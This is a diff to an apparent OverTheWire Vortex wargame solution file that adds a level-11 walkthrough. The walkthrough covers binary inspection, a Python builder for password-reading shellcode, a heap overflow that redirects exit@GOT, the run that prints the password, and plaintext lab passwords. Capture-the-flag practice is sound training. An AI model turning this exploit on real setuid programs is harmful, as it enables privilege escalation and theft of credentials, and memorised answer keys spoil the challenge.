@@ -10,7 +10,8 @@
   "7": "Get the vortex8 password. /vortex/vortex7 (setuid vortex8) only runs strcpy on argv[1] when its CRC32 is 0xe1ca95ee; solve the CRC patch with a GF(2) linear system, then overflow the 350-byte buffer with a NOP sled and setreuid shellcode on the executable stack, delivered by a raw-bytes argv driver.",
   "8": "Get the vortex9 password. /vortex/vortex8 (setuid vortex9) drops its euid before overflowing, but the safecode thread it spawned keeps euid vortex9; overwrite sleep's GOT slot to hijack the thread, sweep the buffer address with a uid-signature shellcode, then run a password shellcode that reads /etc/vortex_pass/vortex9 \u2014 over ssh -T, since a pty drags the thread's euid down.",
   "9": "Get the vortex10 password. There is no /vortex/vortex9 binary and /vortex/vortex10 is unreachable from vortex9, but /var/mail/vortex9 holds the vortex10 password in plain text; read it and log in as vortex10.",
-  "10": "Get the vortex11 password. /vortex/vortex10 (setuid vortex11) seeds rand() with a time-derived value and prints 20 rand() outputs; brute-force the seed with the target's own libc rand, then send the seed as 4 raw little-endian bytes to get a shell as vortex11."
+  "10": "Get the vortex11 password. /vortex/vortex10 (setuid vortex11) seeds rand() with a time-derived value and prints 20 rand() outputs; brute-force the seed with the target's own libc rand, then send the seed as 4 raw little-endian bytes to get a shell as vortex11.",
+  "11": "Get the vortex12 password. /vortex/vortex11 (setuid vortex12) embeds its own phkmalloc; overflow the strcpy on argv[1] to corrupt the next page's header, aim the next malloc at exit@GOT with a fake chunk, overwrite it with a shellcode address via the 15-byte strncpy on argv[2], and land in a NOP-sled EGG variable that reads /etc/vortex_pass/vortex12 -- pin the EGG address with a -m32 helper run with the same argv."
  },
  "host": "vortex.labs.overthewire.org",
  "levels": [
@@ -5088,6 +5089,459 @@
      "cmd": "cat /etc/vortex_pass/vortex11",
      "out": [
       "xb4DVZ2av"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    }
+   ]
+  },
+  {
+   "lvl": 11,
+   "pw": "YufVIb8Mo",
+   "user": "vortex11",
+   "steps": [
+    {
+     "cmd": "ssh vortex11@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "cd /tmp && mktemp -d",
+     "out": [
+      "/tmp/tmp.ABDXAvCAI4"
+     ]
+    },
+    {
+     "cmd": "cd /tmp/tmp.* 2>/dev/null; pwd",
+     "out": [
+      "/tmp"
+     ]
+    },
+    {
+     "cmd": "ls -l /vortex/vortex11",
+     "out": [
+      "-r-sr-x--- 1 vortex12 vortex11 20660 Oct 25 13:40 /vortex/vortex11"
+     ]
+    },
+    {
+     "cmd": "file /vortex/vortex11",
+     "out": [
+      "/vortex/vortex11: setuid ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a1ba7f38e8e52540c2192b106fdbb6c91c44aeab, for GNU/Linux 3.2.0, not stripped"
+     ]
+    },
+    {
+     "cmd": "md5sum /vortex/vortex11",
+     "out": [
+      "c6b84d4cebbd082a3c852c83305443b2  /vortex/vortex11"
+     ]
+    },
+    {
+     "cmd": "readelf -l /vortex/vortex11 | grep -E 'GNU_STACK|RELRO' -A1",
+     "out": [
+      "  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+      "  GNU_RELRO      0x003f00 0x0804cf00 0x0804cf00 0x00100 0x00100 R   0x1"
+     ]
+    },
+    {
+     "cmd": "objdump -d /vortex/vortex11 -M intel | sed -n '/<main>:/,/^$/p'",
+     "out": [
+      "0804a97d <main>:",
+      " 804a97d:\t8d 4c 24 04          \tlea    ecx,[esp+0x4]",
+      " 804a981:\t83 e4 f0             \tand    esp,0xfffffff0",
+      " 804a984:\tff 71 fc             \tpush   DWORD PTR [ecx-0x4]",
+      " 804a987:\t55                   \tpush   ebp",
+      " 804a988:\t89 e5                \tmov    ebp,esp",
+      " 804a98a:\t53                   \tpush   ebx",
+      " 804a98b:\t51                   \tpush   ecx",
+      " 804a98c:\t83 ec 10             \tsub    esp,0x10",
+      " 804a98f:\t89 cb                \tmov    ebx,ecx",
+      " 804a991:\t83 3b 02             \tcmp    DWORD PTR [ebx],0x2",
+      " 804a994:\t7f 0a                \tjg     804a9a0 <main+0x23>",
+      " 804a996:\t83 ec 0c             \tsub    esp,0xc",
+      " 804a999:\t6a 00                \tpush   0x0",
+      " 804a99b:\te8 00 e7 ff ff       \tcall   80490a0 <exit@plt>",
+      " 804a9a0:\t83 ec 0c             \tsub    esp,0xc",
+      " 804a9a3:\t68 00 08 00 00       \tpush   0x800",
+      " 804a9a8:\te8 77 ff ff ff       \tcall   804a924 <malloc>",
+      " 804a9ad:\t83 c4 10             \tadd    esp,0x10",
+      " 804a9b0:\t89 45 e8             \tmov    DWORD PTR [ebp-0x18],eax",
+      " 804a9b3:\t83 ec 0c             \tsub    esp,0xc",
+      " 804a9b6:\t6a 10                \tpush   0x10",
+      " 804a9b8:\te8 67 ff ff ff       \tcall   804a924 <malloc>",
+      " 804a9bd:\t83 c4 10             \tadd    esp,0x10",
+      " 804a9c0:\t89 45 ec             \tmov    DWORD PTR [ebp-0x14],eax",
+      " 804a9c3:\t83 ec 0c             \tsub    esp,0xc",
+      " 804a9c6:\t68 00 08 00 00       \tpush   0x800",
+      " 804a9cb:\te8 54 ff ff ff       \tcall   804a924 <malloc>",
+      " 804a9d0:\t83 c4 10             \tadd    esp,0x10",
+      " 804a9d3:\t89 45 f0             \tmov    DWORD PTR [ebp-0x10],eax",
+      " 804a9d6:\t8b 43 04             \tmov    eax,DWORD PTR [ebx+0x4]",
+      " 804a9d9:\t83 c0 04             \tadd    eax,0x4",
+      " 804a9dc:\t8b 00                \tmov    eax,DWORD PTR [eax]",
+      " 804a9de:\t83 ec 08             \tsub    esp,0x8",
+      " 804a9e1:\t50                   \tpush   eax",
+      " 804a9e2:\tff 75 f0             \tpush   DWORD PTR [ebp-0x10]",
+      " 804a9e5:\te8 96 e6 ff ff       \tcall   8049080 <strcpy@plt>",
+      " 804a9ea:\t83 c4 10             \tadd    esp,0x10",
+      " 804a9ed:\t83 ec 0c             \tsub    esp,0xc",
+      " 804a9f0:\t6a 10                \tpush   0x10",
+      " 804a9f2:\te8 2d ff ff ff       \tcall   804a924 <malloc>",
+      " 804a9f7:\t83 c4 10             \tadd    esp,0x10",
+      " 804a9fa:\t89 45 f4             \tmov    DWORD PTR [ebp-0xc],eax",
+      " 804a9fd:\t8b 43 04             \tmov    eax,DWORD PTR [ebx+0x4]",
+      " 804aa00:\t83 c0 08             \tadd    eax,0x8",
+      " 804aa03:\t8b 00                \tmov    eax,DWORD PTR [eax]",
+      " 804aa05:\t83 ec 04             \tsub    esp,0x4",
+      " 804aa08:\t6a 0f                \tpush   0xf",
+      " 804aa0a:\t50                   \tpush   eax",
+      " 804aa0b:\tff 75 f4             \tpush   DWORD PTR [ebp-0xc]",
+      " 804aa0e:\te8 fd e6 ff ff       \tcall   8049110 <strncpy@plt>",
+      " 804aa13:\t83 c4 10             \tadd    esp,0x10",
+      " 804aa16:\t83 ec 0c             \tsub    esp,0xc",
+      " 804aa19:\t6a 00                \tpush   0x0",
+      " 804aa1b:\te8 80 e6 ff ff       \tcall   80490a0 <exit@plt>"
+     ]
+    },
+    {
+     "cmd": "objdump -R /vortex/vortex11 | grep -E 'exit|malloc|strcpy|strncpy'",
+     "out": [
+      "0804d014 R_386_JUMP_SLOT   strcpy@GLIBC_2.0",
+      "0804d01c R_386_JUMP_SLOT   exit@GLIBC_2.0",
+      "0804d038 R_386_JUMP_SLOT   strncpy@GLIBC_2.0"
+     ]
+    },
+    {
+     "cmd": "grep -c . /dev/null",
+     "out": [
+      "0"
+     ]
+    },
+    {
+     "cmd": "vim build11.py",
+     "text": "vim build11.py -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "build11.py                                                                        0,0-1          All",
+      "\"build11.py\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim build11.py",
+     "text": "vim build11.py -- insert chunk 1",
+     "out": [
+      "  1 #!/usr/bin/env python3",
+      "  2 # Build the L11 craft payload (argv[1]) and the EGG sled (shellcode).",
+      "  3 #",
+      "  4 # Heap layout (gdb-verified):",
+      "  5 #   a = malloc(0x800) -> 0x804f000",
+      "  6 #   b = malloc(0x10)  -> 0x8050030",
+      "  7 #   c = malloc(0x800) -> 0x804f800   <-- argv[1] lands here",
+      "  8 #   d = malloc(0x10)  -> 0x8050040",
+      "  9 #",
+      " 10 # c spans 0x804f800..0x8050000 (2048 bytes); byte 2048 is the page",
+      " 11 # header of the NEXT phkmalloc page (0x8050000): prev/next/info/bitmap.",
+      " 12 #",
+      " 13 # The overflow: strcpy(c, argv[1]) has no bound, so 2048 filler bytes",
+      " 14 # reach the page header and 9 more craft bytes overwrite it:",
+      " 15 #   prev  = 0x11111111 (junk)",
+      " 16 #   next  = 0x0804cfdc (points INTO the old a-chunk region)",
+      " 17 #   info  = 0x11       (byte; copy stops at the NUL right after)",
+      " 18 #",
+      " 19 # Then d = malloc(0x10) walks the corrupt list: it lands on a fake",
+      " 20 # chunk whose bit_index shift gives base+64 == 0x804d01c == exit@GOT.",
+      " 21 # strncpy(d, argv[2], 15) then writes 15 bytes over exit@GOT.",
+      " 22 import sys, struct",
+      " 23",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "build11.py [+]                                                                    23,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim build11.py",
+     "text": "vim build11.py -- insert chunk 2",
+     "out": [
+      " 18 #",
+      " 19 # Then d = malloc(0x10) walks the corrupt list: it lands on a fake",
+      " 20 # chunk whose bit_index shift gives base+64 == 0x804d01c == exit@GOT.",
+      " 21 # strncpy(d, argv[2], 15) then writes 15 bytes over exit@GOT.",
+      " 22 import sys, struct",
+      " 23",
+      " 24 # the password shellcode: NUL-free, 73 bytes, int 0x80 open/read/write",
+      " 25 #   build \"/etc/vortex_pass/vortex1\" on the stack (7 dwords), then",
+      " 26 #   mov byte [ebx+24],'2'  -> \"/etc/vortex_pass/vortex12\", then",
+      " 27 #   open(eax=5)/read(eax=3)/write(eax=4)/exit(eax=1) via int 0x80",
+      " 28 SC = bytes.fromhex(",
+      " 29     '31c050'",
+      " 30     '6874657831'  # push 0x31786574  'tex1'",
+      " 31     '682f766f72'  # push 0x726f762f  'vor/'",
+      " 32     '6870617373'  # push 0x73736170  'pass'",
+      " 33     '687465785f'  # push 0x5f786574  'tex_'",
+      " 34     '682f766f72'  # push 0x726f762f  'vor/'",
+      " 35     '682f657463'  # push 0x6374652f  '/etc'",
+      " 36     '89e3'",
+      " 37     'c6431832'    # mov byte [ebx+24], 0x32   '1'->'2'",
+      " 38     '31c9'  'b005'  'cd80'   # open(path, 0)",
+      " 39     '89c3'",
+      " 40     'b003'  '89e1'  '31d2'  'b264'  'cd80'   # read(fd, path, 100)",
+      " 41     '89c2'",
+      " 42     'b004'  'b301'  '89e1'  'cd80'   # write(1, buf, n)",
+      " 43     'b001'  '31db'  'cd80')  # exit(0)",
+      " 44 assert len(SC) == 73 and b'\\x00' not in SC",
+      " 45",
+      "build11.py [+]                                                                    45,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim build11.py",
+     "text": "vim build11.py -- insert chunk 3",
+     "out": [
+      " 25 #   build \"/etc/vortex_pass/vortex1\" on the stack (7 dwords), then",
+      " 26 #   mov byte [ebx+24],'2'  -> \"/etc/vortex_pass/vortex12\", then",
+      " 27 #   open(eax=5)/read(eax=3)/write(eax=4)/exit(eax=1) via int 0x80",
+      " 28 SC = bytes.fromhex(",
+      " 29     '31c050'",
+      " 30     '6874657831'  # push 0x31786574  'tex1'",
+      " 31     '682f766f72'  # push 0x726f762f  'vor/'",
+      " 32     '6870617373'  # push 0x73736170  'pass'",
+      " 33     '687465785f'  # push 0x5f786574  'tex_'",
+      " 34     '682f766f72'  # push 0x726f762f  'vor/'",
+      " 35     '682f657463'  # push 0x6374652f  '/etc'",
+      " 36     '89e3'",
+      " 37     'c6431832'    # mov byte [ebx+24], 0x32   '1'->'2'",
+      " 38     '31c9'  'b005'  'cd80'   # open(path, 0)",
+      " 39     '89c3'",
+      " 40     'b003'  '89e1'  '31d2'  'b264'  'cd80'   # read(fd, path, 100)",
+      " 41     '89c2'",
+      " 42     'b004'  'b301'  '89e1'  'cd80'   # write(1, buf, n)",
+      " 43     'b001'  '31db'  'cd80')  # exit(0)",
+      " 44 assert len(SC) == 73 and b'\\x00' not in SC",
+      " 45",
+      " 46 # craft: 2048 filler + prev(4) + next(4) + info byte",
+      " 47 craft = b'A'*2048",
+      " 48 craft += struct.pack('<I', 0x11111111)",
+      " 49 craft += struct.pack('<I', 0x0804cfdc)",
+      " 50 craft += b'\\x11'",
+      " 51 assert len(craft) == 2057 and b'\\x00' not in craft",
+      " 52",
+      "build11.py [+]                                                                    52,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim build11.py",
+     "text": "vim build11.py -- insert chunk 4",
+     "out": [
+      " 28 SC = bytes.fromhex(",
+      " 29     '31c050'",
+      " 30     '6874657831'  # push 0x31786574  'tex1'",
+      " 31     '682f766f72'  # push 0x726f762f  'vor/'",
+      " 32     '6870617373'  # push 0x73736170  'pass'",
+      " 33     '687465785f'  # push 0x5f786574  'tex_'",
+      " 34     '682f766f72'  # push 0x726f762f  'vor/'",
+      " 35     '682f657463'  # push 0x6374652f  '/etc'",
+      " 36     '89e3'",
+      " 37     'c6431832'    # mov byte [ebx+24], 0x32   '1'->'2'",
+      " 38     '31c9'  'b005'  'cd80'   # open(path, 0)",
+      " 39     '89c3'",
+      " 40     'b003'  '89e1'  '31d2'  'b264'  'cd80'   # read(fd, path, 100)",
+      " 41     '89c2'",
+      " 42     'b004'  'b301'  '89e1'  'cd80'   # write(1, buf, n)",
+      " 43     'b001'  '31db'  'cd80')  # exit(0)",
+      " 44 assert len(SC) == 73 and b'\\x00' not in SC",
+      " 45",
+      " 46 # craft: 2048 filler + prev(4) + next(4) + info byte",
+      " 47 craft = b'A'*2048",
+      " 48 craft += struct.pack('<I', 0x11111111)",
+      " 49 craft += struct.pack('<I', 0x0804cfdc)",
+      " 50 craft += b'\\x11'",
+      " 51 assert len(craft) == 2057 and b'\\x00' not in craft",
+      " 52",
+      " 53 # egg: big NOP sled so the exact shellcode address needs no precision",
+      " 54 egg  = b'\\x90'*1500 + SC",
+      " 55",
+      "build11.py [+]                                                                    55,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim build11.py",
+     "text": "vim build11.py -- insert chunk 5",
+     "out": [
+      " 32     '6870617373'  # push 0x73736170  'pass'",
+      " 33     '687465785f'  # push 0x5f786574  'tex_'",
+      " 34     '682f766f72'  # push 0x726f762f  'vor/'",
+      " 35     '682f657463'  # push 0x6374652f  '/etc'",
+      " 36     '89e3'",
+      " 37     'c6431832'    # mov byte [ebx+24], 0x32   '1'->'2'",
+      " 38     '31c9'  'b005'  'cd80'   # open(path, 0)",
+      " 39     '89c3'",
+      " 40     'b003'  '89e1'  '31d2'  'b264'  'cd80'   # read(fd, path, 100)",
+      " 41     '89c2'",
+      " 42     'b004'  'b301'  '89e1'  'cd80'   # write(1, buf, n)",
+      " 43     'b001'  '31db'  'cd80')  # exit(0)",
+      " 44 assert len(SC) == 73 and b'\\x00' not in SC",
+      " 45",
+      " 46 # craft: 2048 filler + prev(4) + next(4) + info byte",
+      " 47 craft = b'A'*2048",
+      " 48 craft += struct.pack('<I', 0x11111111)",
+      " 49 craft += struct.pack('<I', 0x0804cfdc)",
+      " 50 craft += b'\\x11'",
+      " 51 assert len(craft) == 2057 and b'\\x00' not in craft",
+      " 52",
+      " 53 # egg: big NOP sled so the exact shellcode address needs no precision",
+      " 54 egg  = b'\\x90'*1500 + SC",
+      " 55",
+      " 56 open('craft.bin','wb').write(craft)",
+      " 57 open('egg.bin','wb').write(egg)",
+      " 58 print('craft', len(craft), 'egg', len(egg))",
+      " 59",
+      "build11.py [+]                                                                    59,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim build11.py",
+     "text": "vim build11.py -- finished, before :wq",
+     "out": [
+      " 32     '6870617373'  # push 0x73736170  'pass'",
+      " 33     '687465785f'  # push 0x5f786574  'tex_'",
+      " 34     '682f766f72'  # push 0x726f762f  'vor/'",
+      " 35     '682f657463'  # push 0x6374652f  '/etc'",
+      " 36     '89e3'",
+      " 37     'c6431832'    # mov byte [ebx+24], 0x32   '1'->'2'",
+      " 38     '31c9'  'b005'  'cd80'   # open(path, 0)",
+      " 39     '89c3'",
+      " 40     'b003'  '89e1'  '31d2'  'b264'  'cd80'   # read(fd, path, 100)",
+      " 41     '89c2'",
+      " 42     'b004'  'b301'  '89e1'  'cd80'   # write(1, buf, n)",
+      " 43     'b001'  '31db'  'cd80')  # exit(0)",
+      " 44 assert len(SC) == 73 and b'\\x00' not in SC",
+      " 45",
+      " 46 # craft: 2048 filler + prev(4) + next(4) + info byte",
+      " 47 craft = b'A'*2048",
+      " 48 craft += struct.pack('<I', 0x11111111)",
+      " 49 craft += struct.pack('<I', 0x0804cfdc)",
+      " 50 craft += b'\\x11'",
+      " 51 assert len(craft) == 2057 and b'\\x00' not in craft",
+      " 52",
+      " 53 # egg: big NOP sled so the exact shellcode address needs no precision",
+      " 54 egg  = b'\\x90'*1500 + SC",
+      " 55",
+      " 56 open('craft.bin','wb').write(craft)",
+      " 57 open('egg.bin','wb').write(egg)",
+      " 58 print('craft', len(craft), 'egg', len(egg))",
+      " 59",
+      "build11.py [+]                                                                    59,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "python3 build11.py",
+     "out": [
+      "craft 2057 egg 1573"
+     ]
+    },
+    {
+     "cmd": "cat > h11.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char **argv) {\n    printf(\"%p\\n\", (void*)getenv(\"EGG\"));\n    return 0; }\nEOF",
+     "out": []
+    },
+    {
+     "cmd": "gcc -m32 -o h11 h11.c",
+     "out": []
+    },
+    {
+     "cmd": "export EGG=\"$(cat egg.bin)\"",
+     "out": []
+    },
+    {
+     "cmd": "EA=$(./h11 \"$(cat craft.bin)\" \"BBBBBBBBBBBBBBB\"); echo \"EGG at $EA\"",
+     "out": [
+      "EGG at 0xffffd7d7"
+     ]
+    },
+    {
+     "cmd": "TGT=$(( EA + 1024 )); L=$((TGT & 255)); B1=$(((TGT>>8)&255)); B2=$(((TGT>>16)&255)); B3=$(((TGT>>24)&255)); if [ \"$L\" -eq 0 ]; then TGT=$((TGT+1)); L=$((TGT & 255)); fi; HX=$(printf '%02x%02x%02x%02x' $L $B1 $B2 $B3); A2=\"$(printf \"\\x${HX:0:2}\\x${HX:2:2}\\x${HX:4:2}\\x${HX:6:2}BBBBBBBBBBB\")\"; echo \"TGT=$TGT HX=$HX\"",
+     "out": [
+      "TGT=4294958039 HX=d7dbffff"
+     ]
+    },
+    {
+     "cmd": "A1=\"$(cat craft.bin)\"",
+     "out": []
+    },
+    {
+     "cmd": "/vortex/vortex11 \"$A1\" \"$A2\"; echo \"RC=$?\"",
+     "out": [
+      "YufVIb8Mo",
+      "RC=0"
+     ]
+    },
+    {
+     "cmd": "unset EGG",
+     "out": []
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "ssh vortex12@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5012(vortex12) gid=5012(vortex12) groups=5012(vortex12)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex12",
+     "out": [
+      "YufVIb8Mo"
+     ]
+    },
+    {
+     "cmd": "ls -l /vortex/vortex12",
+     "out": [
+      "-r-sr-x--- 1 vortex13 vortex12 15220 Oct 25 13:40 /vortex/vortex12"
      ]
     },
     {
